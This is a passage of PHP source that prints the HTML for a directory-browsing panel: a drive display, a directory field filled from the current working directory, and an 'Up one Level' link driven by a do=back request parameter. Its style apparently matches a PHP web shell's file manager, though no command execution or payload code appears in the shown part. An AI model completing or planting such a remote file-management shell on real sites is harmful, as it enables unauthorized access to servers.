<tr><td valign="top" height="19" width="842"><p align="left"><span lang="en-us"><font face="Tahoma" style="font-size: 9pt"> Drive  :    '.printdrive().$formg.'Directory : <input name=address value='.getcwd().$slash.' size=100><input type=submit value=Go> </form> <br><a href="?do=back&address='.$backaddresss.'"></font><img src="data:image/png;base64,Qk32AAAAAAAAAHYAAAAoAAAAEAAAABAAAAABAAQAAAAAAIAAAAATCwAAEwsAABAAAAAQAAAAAAAAABQ5NgAhXlgALnt+ADSBhAA4hYgAPouNAFWcqQBsqrQAb7XCAInEzQCP0NoArt7iALLo7QDW9/UA////AAAAAAAAAAAAAiIiIiIiIiAGMzRVVVVVYAh3eBAAABeACpmaABAAGaAMu7wADcu7wA7d3gAO7d3gD///AA////AP8QAAAAD/8A7tEAAADe7gDLyxAAC8y8AKmakQCaqZoAh3eHF4h3eABjMzRWQzM2ACIiIiIiIiIAAAAAAAAAAA" title="Up one Level"/></span></td>
</tr></table>'.$fil.$file.'</table>
<table border="0" width="950" style="border-collapse: collapse" id="table4" cellpadding="5">
</form></td></tr>
'.$end;
?>